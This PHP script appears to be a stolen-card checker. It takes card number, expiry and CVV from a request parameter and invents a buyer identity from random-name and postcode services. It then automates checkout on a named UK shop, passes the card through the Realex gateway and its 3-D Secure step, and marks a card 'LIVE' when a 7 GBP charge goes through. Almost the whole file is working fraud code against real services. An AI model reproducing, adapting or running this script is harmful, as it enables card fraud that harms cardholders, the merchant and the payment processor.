<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $postcodes = file_get_contents('http://api.postcodes.io/random/postcodes');
    $getUkPostcode = json_decode($postcodes, true);
    $postcode = $getUkPostcode['result']['postcode'];
    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united%20states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $city = preg_split("/[\s,]+/", $data['street2'])[0];
    $state = preg_split("/[\s,]+/", $data['street2'])[1];
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://medicareplus.co.uk/product/medi-disposal-bags/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundaryTCwBmtQbpykAsCaK',
            'Origin: https://medicareplus.co.uk',
            'Referer: https://medicareplus.co.uk/product/medi-disposal-bags/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundaryTCwBmtQbpykAsCaK\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryTCwBmtQbpykAsCaK\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n2461\r\n------WebKitFormBoundaryTCwBmtQbpykAsCaK--\r\n"
    ));
    $addToCart = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://medicareplus.co.uk/checkout/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://medicareplus.co.uk/cart/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $getSomeHelp = curl_exec($ch);
    $checkoutNonce = GetStr($getSomeHelp, 'name="woocommerce-process-checkout-nonce" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://medicareplus.co.uk/?wc-ajax=checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://medicareplus.co.uk',
            'Referer: https://medicareplus.co.uk/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=GB&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=&billing_postcode=$postcode&billing_phone=$phone&billing_email=$fname$lname@gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=GB&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=realex_redirect&woocommerce-process-checkout-nonce=$checkoutNonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $checkout = curl_exec($ch);
    $orderId = GetStr($checkout, 'order-pay\/', '\/');
    $wcOrder = GetStr($checkout, '?key=', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://medicareplus.co.uk/checkout/order-pay/'.$orderId.'/?key='.$wcOrder,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    foreach(explode("<input type=\"hidden\"", GetStr(curl_exec($ch), '<form action="https://pay.realexpayments.com/pay" method="post">', "</form>")) as $values){
        $form[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/pay',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://medicareplus.co.uk',
            'Referer: https://medicareplus.co.uk/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => http_build_query($form)
    ));
    $pay = curl_exec($ch);
    $guid = GetStr($pay, "https://pay.realexpayments.com/card.html?guid=", "\r\n");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/3ds2/verifyEnrolled',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate="
    ));
    $verifyEnrolled = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/cardIdentification',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate="
    ));
    $cardIdentification = curl_exec($ch);
    $dccrate = GetStr($cardIdentification, '"dccRate":', ',"cardIssuer"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/auth',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=$mm%2F".substr($yy, 2, 4)."&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=&browserJavaEnabled=false&browserLanguage=en-US&screenColorDepth=24&screenHeight=1080&screenWidth=1920&timezoneUtcOffset=-480&paymentFormHeight=575&paymentFormWidth=600"
    ));
    $auth = json_decode(curl_exec($ch), true);
    $encryptMerchantData = $auth['data']['encryptMerchantData'];
    $pareq = $auth['data']['verifyEnrolledResult']['pareq'];
    $acsurl = $auth['data']['verifyEnrolledResult']['acsurl'];

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $acsurl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaReq=".urlencode($pareq)."&MD=".urlencode($encryptMerchantData)."&TermUrl=https%3A%2F%2Fpay.realexpayments.com%2Facs%2FthreeDSecure"
    ));
    $damn_son = curl_exec($ch);
    $pares = GetStr($damn_son, '<input type="hidden" name="PaRes" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/acs/threeDSecure',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://aacsw.3ds.verifiedbyvisa.com',
            'Referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($pares)."&MD=".urlencode($encryptMerchantData)
    ));
    $threeDSecure = curl_exec($ch);
    $loc = GetStr($threeDSecure, "Location: ", "\r\n");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $loc,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $locsNaman = curl_exec($ch);
    $rezt = GetStr($locsNaman, '<script type="text/javascript">window.top.location.href = "', '"')."<br>";

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $rezt,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://pay.realexpayments.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $result = curl_exec($ch);
    curl_close($ch);

    $respo = GetStr(GetStr($result, '<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">', '<form id="order_review" method="post">'), '<li>','</li>');

    if(strpos($result, 'order-received')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged 7 GBP</span></td></tr><br>';

    } elseif (strpos($result, 'unsuccessful')) {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>